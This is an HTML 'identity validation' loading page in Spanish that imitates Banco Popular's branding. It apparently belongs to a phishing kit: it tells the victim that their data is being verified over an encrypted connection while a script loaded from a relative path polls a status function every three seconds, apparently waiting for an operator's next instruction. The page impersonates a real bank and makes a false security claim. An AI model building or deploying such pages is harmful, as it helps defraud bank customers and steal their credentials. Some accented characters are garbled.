<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Procesando | Banco Popular</title>
    <link rel="icon" type="image/png" href="popular_logo.png">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="../../scripts/functions2.js"></script>
    <style>
        :root {
            --popular-green: #1ca35a;
            --popular-dark: #004225;
            --accent-orange: #f68b1e;
            --text-dark: #121212;
            --text-gray: #666666;
            --bg-body: #ffffff;
        }

        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #ffffff;
            font-family: 'Inter', sans-serif;
            color: var(--text-dark);
        }

        .loader-wrapper {
            text-align: center;
            padding: 40px;
            max-width: 400px;
            width: 90%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo-banco {
            width: 140px;
            height: auto;
            margin-bottom: 50px;
            opacity: 0.9;
        }

        /* Modern Ripple Spinner */
        .spinner-box {
            position: relative;
            width: 100px;
            height: 100px;
            margin-bottom: 45px;
        }

        .ripple {
            position: absolute;
            border: 4px solid var(--popular-green);
            opacity: 1;
            border-radius: 50%;
            animation: ripple-effect 1.2s cubic-bezier(0, 0.2, 0.8, 1) infinite;
        }

        .ripple:nth-child(2) {
            animation-delay: -0.5s;
            border-color: var(--accent-orange);
        }

        @keyframes ripple-effect {
            0% {
                top: 50px;
                left: 50px;
                width: 0;
                height: 0;
                opacity: 0;
            }
            4.9% {
                top: 50px;
                left: 50px;
                width: 0;
                height: 0;
                opacity: 0;
            }
            5% {
                top: 50px;
                left: 50px;
                width: 0;
                height: 0;
                opacity: 1;
            }
            100% {
                top: 0px;
                left: 0px;
                width: 100px;
                height: 100px;
                opacity: 0;
            }
        }

        .message-title {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 12px;
            color: var(--text-dark);
        }

        .message-body {
            font-size: 14px;
            color: var(--text-gray);
            line-height: 1.5;
            margin-bottom: 30px;
        }

        /* Branded Mini Progress Bar */
        .loading-bar {
            width: 100%;
            max-width: 200px;
            height: 4px;
            background-color: #f1f1f1;
            border-radius: 10px;
            overflow: hidden;
            position: relative;
        }

        .loading-progress {
            position: absolute;
            height: 100%;
            width: 40%;
            background-color: var(--popular-green);
            border-radius: 10px;
            animation: slide-bar 1.8s infinite ease-in-out;
        }

        @keyframes slide-bar {
            0% { left: -40%; }
            100% { left: 100%; }
        }

        .security-note {
            margin-top: 60px;
            font-size: 12px;
            color: #999;
            display: flex;
            align-items: center;
            gap: 8px;
        }
    </style>
</head>
<body>

    <div class="loader-wrapper">
        <img src="popular_logo.png" alt="Banco Popular" class="logo-banco">
        
        <div class="spinner-box">
            <div class="ripple"></div>
            <div class="ripple"></div>
        </div>

        <div class="message-title">Validando identidad</div>
        <p class="message-body">
            Por favor, espera unos segundos mientras verificamos <br>tu informaciÃ³n de forma segura.
        </p>

        <div class="loading-bar">
            <div class="loading-progress"></div>
        </div>

        <div class="security-note">
            <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
            ConexiÃ³n cifrada de alta seguridad
        </div>
    </div>

    <script>
        $(document).ready(function() {
            // Standard pooling logic from project
            setInterval(consultar_estado, 3000);
            console.log("Banco Popular: Polling status...");
        });
    </script>
</body>
</html>

